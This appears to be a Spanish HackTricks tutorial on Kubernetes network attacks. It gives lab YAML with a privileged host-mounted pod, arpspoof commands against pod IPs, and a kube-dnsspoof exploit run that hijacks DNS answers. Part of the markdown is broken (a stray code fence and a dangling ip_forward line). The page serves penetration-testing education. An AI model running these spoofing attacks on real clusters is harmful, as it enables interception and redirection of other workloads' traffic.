# Ataques de red en Kubernetes

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Introducci√≥n

Kubernetes por defecto **conecta** todos los **contenedores que se ejecutan en el mismo nodo** (incluso si pertenecen a diferentes espacios de nombres) hasta **la capa 2** (ethernet). Esto permite que un contenedor malicioso realice un **ataque de ARP spoofing** a los contenedores en el mismo nodo y capture su tr√°fico.

En el escenario se van a crear 4 m√°quinas:

* ubuntu-pe: M√°quina privilegiada para escapar al nodo y comprobar las m√©tricas (no es necesario para el ataque)
* **ubuntu-attack**: Contenedor **malicioso** en el espacio de nombres predeterminado
* **ubuntu-victim**: M√°quina **v√≠ctima** en el espacio de nombres kube-system
* **mysql**: M√°quina **v√≠ctima** en el espacio de nombres predeterminado

```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
  name: ubuntu-pe
spec:
  containers:
  - image: ubuntu
    command:
      - "sleep"
      - "360000" 
    imagePullPolicy: IfNotPresent
    name: ubuntu-pe
    securityContext:
      allowPrivilegeEscalation: true
      privileged: true
      runAsUser: 0 
    volumeMounts:
    - mountPath: /host
      name: host-volume
  restartPolicy: Never 
  hostIPC: true 
  hostNetwork: true 
  hostPID: true 
  volumes:
  - name: host-volume
    hostPath:
      path: /
---
apiVersion: v1
kind: Pod
metadata:
  name: ubuntu-attack
  labels:
    app: ubuntu
spec:
  containers:
  - image: ubuntu
    command:
      - "sleep"
      - "360000" 
    imagePullPolicy: IfNotPresent
    name: ubuntu-attack
  restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
  name: ubuntu-victim
  namespace: kube-system
spec:
  containers:
  - image: ubuntu
    command:
      - "sleep"
      - "360000" 
    imagePullPolicy: IfNotPresent
    name: ubuntu-victim
  restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
  name: mysql
spec:
  containers:
  - image: mysql:5.6
    ports:
      - containerPort: 3306
    imagePullPolicy: IfNotPresent
    name: mysql
    env:
      - name: MYSQL_ROOT_PASSWORD
        value: mysql
  restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```

## Redes b√°sicas de Kubernetes

Si desea obtener m√°s detalles sobre los temas de redes introducidos aqu√≠, consulte las referencias.

### ARP

En general, **la red de pod a pod dentro del nodo** est√° disponible a trav√©s de un **puente** que conecta todos los pods. Este puente se llama "**cbr0**". (Algunos complementos de red instalar√°n su propio puente). El **cbr0 tambi√©n puede manejar la resoluci√≥n ARP** (Protocolo de resoluci√≥n de direcciones). Cuando llega un paquete entrante a cbr0, puede resolver la direcci√≥n MAC de destino utilizando ARP.

Este hecho implica que, por defecto, **cada pod que se ejecuta en el mismo nodo** va a poder **comunicarse** con cualquier otro pod en el mismo nodo (independientemente del espacio de nombres) a nivel de Ethernet (capa 2).

{% hint style="warning" %}
Por lo tanto, es posible realizar ataques de **ARP Spoofing entre pods en el mismo nodo**.
{% endhint %}

### DNS

En los entornos de Kubernetes, generalmente encontrar√° 1 (o m√°s) **servicios DNS en ejecuci√≥n** generalmente en el espacio de nombres kube-system:

```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
                   kubernetes.io/cluster-service=true
                   kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
                   prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```

En la informaci√≥n anterior se puede ver algo interesante, la **IP del servicio** es **10.96.0.10** pero la **IP del pod** que ejecuta el servicio es **172.17.0.2**.

Si comprueba la direcci√≥n DNS dentro de cualquier pod, encontrar√° algo como esto:

```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
# Para habilitar el reenv√≠o de IP: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof

```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```

## DNS Spoofing

Como ya se mencion√≥, si **compromete un pod en el mismo nodo del pod del servidor DNS**, puede **MitM** con **ARPSpoofing** el **puente y el pod DNS** y **modificar todas las respuestas DNS**.

Tiene una **herramienta** y **tutorial** realmente buenos para probar esto en [**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)

En nuestro escenario, **descargue** la **herramienta** en el pod del atacante y cree un \*\*archivo llamado `hosts` \*\* con los **dominios** que desea **falsificar** como:

```
cat hosts
google.com. 1.1.1.1
```

Realice el ataque a la m√°quina ubuntu-victim:

```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#En la m√°quina ubuntu
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```

{% hint style="info" %}
Si intenta crear su propio script de falsificaci√≥n de DNS, si **solo modifica la respuesta DNS** que no va a **funcionar**, porque la **respuesta** va a tener una **IP de origen** la direcci√≥n IP del **pod malicioso** y no ser√° **aceptada**.\
Necesita generar un **nuevo paquete DNS** con la **IP de origen** del **DNS** donde la v√≠ctima env√≠a la solicitud DNS (que es algo como 172.16.0.2, no 10.96.0.10, ese es el IP del servicio DNS de K8s y no la IP del servidor DNS, m√°s sobre esto en la introducci√≥n).
{% endhint %}

## Capturando Tr√°fico

La herramienta [**Mizu**](https://github.com/up9inc/mizu) es un visor de tr√°fico API simple pero potente para Kubernetes que le permite **ver toda la comunicaci√≥n API** entre microservicios para ayudarlo a depurar y solucionar problemas de regresi√≥n.\
Instalar√° agentes en los pods seleccionados y recopilar√° su informaci√≥n de tr√°fico y le mostrar√° en un servidor web. Sin embargo, necesitar√° permisos altos de K8s para esto (y no es muy sigiloso).

## Referencias

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si desea ver su **empresa anunciada en HackTricks** o si desea acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulte los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obtenga el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>